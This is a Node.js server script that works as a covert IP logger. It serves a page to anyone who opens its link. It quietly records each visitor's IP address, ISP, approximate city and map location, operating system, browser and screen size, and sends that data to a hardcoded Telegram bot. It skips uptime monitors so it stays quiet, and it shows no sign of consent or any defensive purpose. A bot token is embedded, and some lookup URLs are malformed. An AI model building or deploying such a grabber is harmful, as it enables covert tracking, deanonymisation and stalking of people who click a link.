const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

// --- TELEGRAM CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = "8800421642:AAFaQPILSBVnrlPOy_rmoSwAmYl5FRC9s_8";
const TELEGRAM_CHAT_ID = "8714686528"; 

// Temporary server memory to sync screen data packets with incoming IP logs
let connectionCache = {};

function sendTelegramMessage(text) {
    const data = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: "Markdown" });
    const options = {
        hostname: 'api.telegram.org', port: 443, path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
    };
    const req = https.request(options, () => {});
    req.write(data); req.end();
}

// Fetches cellular provider and estimation maps from a free server-side API lookup
function lookupIpDetails(ip, callback) {
    https.get(`https://ipapi.co{ip}/json/`, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            try {
                callback(JSON.parse(data));
            } catch (e) {
                callback(null);
            }
        });
    }).on('error', () => callback(null));
}

const server = http.createServer((req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    if (userAgent.toLowerCase().includes('uptimerobot')) {
        res.writeHead(200, { 'Content-Type': 'text/plain' }); res.end("OK"); return;
    }

    // Extract the public IP passing through Render's network boundaries
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const cleanIp = rawIp.split(',')[0].trim();

    if (req.method === 'GET') {
        const time = new Date().toLocaleTimeString();
        
        // Parse basic device operating system details from the browser header signature
        let os = "Unknown OS";
        let browser = "Unknown Browser";
        
        if (/iPhone|iPad|iPod/i.test(userAgent)) os = "Apple iOS";
        else if (/Android/i.test(userAgent)) os = "Android OS";
        else if (/Windows/i.test(userAgent)) os = "Windows PC";
        else if (/Macintosh/i.test(userAgent)) os = "macOS";

        if (/Chrome/i.test(userAgent)) browser = "Google Chrome";
        else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) browser = "Apple Safari";
        else if (/Firefox/i.test(userAgent)) browser = "Mozilla Firefox";

        // Query the network data provider
        lookupIpDetails(cleanIp, (ipData) => {
            const isp = ipData ? ipData.org || "Unknown Provider" : "Unknown Provider";
            const city = ipData ? ipData.city || "Unknown City" : "Unknown City";
            const country = ipData ? ipData.country_name || "Unknown Country" : "Unknown Country";
            const approxMaps = (ipData && ipData.latitude) ? `https://google.com{ipData.latitude},${ipData.longitude}` : null;

            // Save connection state locally to map it when screen data arrives a millisecond later
            connectionCache[cleanIp] = { time, os, browser, isp, city, country, approxMaps };
            
            // Safety timeout: Send the message anyway if screen synchronization falls behind
            setTimeout(() => {
                if (connectionCache[cleanIp] && !connectionCache[cleanIp].sent) {
                    dispatchLog(cleanIp, "Not Reported");
                }
            }, 1500);
        });

        fs.readFile(path.join(__dirname, 'index.html'), (err, content) => {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(content);
        });
    } 
    else if (req.method === 'POST' && req.url === '/screen-sync') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
            try {
                const screen = JSON.parse(body);
                const screenString = `${screen.width}x${screen.height} (@${screen.ratio}x)`;
                dispatchLog(cleanIp, screenString);
            } catch (e) {
                dispatchLog(cleanIp, "Error Parsing");
            }
            res.writeHead(200); res.end();
        });
    }
});

function dispatchLog(ip, screenDetails) {
    const session = connectionCache[ip];
    if (!session || session.sent) return;
    session.sent = true;

    let mapsText = session.approxMaps ? `\n🗺️ [Estimated ISP Location Gateway](${session.approxMaps})` : "";

    // Build the final single message summary card
    const finalReport = `🌐 *One-Click Connection Summary*\n\n` +
                        `📶 *Public IP:* \`${ip}\`\n` +
                        `🏢 *Internet Provider (ISP):* ${session.isp}\n` +
                        `🌍 *Estimated Region:* ${session.city}, ${session.country}\n` +
                        `📱 *Operating System:* ${session.os}\n` +
                        `🧭 *Web Browser:* ${session.browser}\n` +
                        `🖥️ *Screen Dimensions:* ${screenDetails}\n` +
                        `⏰ *Time Stamp:* ${session.time}\n` +
                        mapsText;

    sendTelegramMessage(finalReport);
    
    // Clear cache profile to save space
    delete connectionCache[ip];
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {});
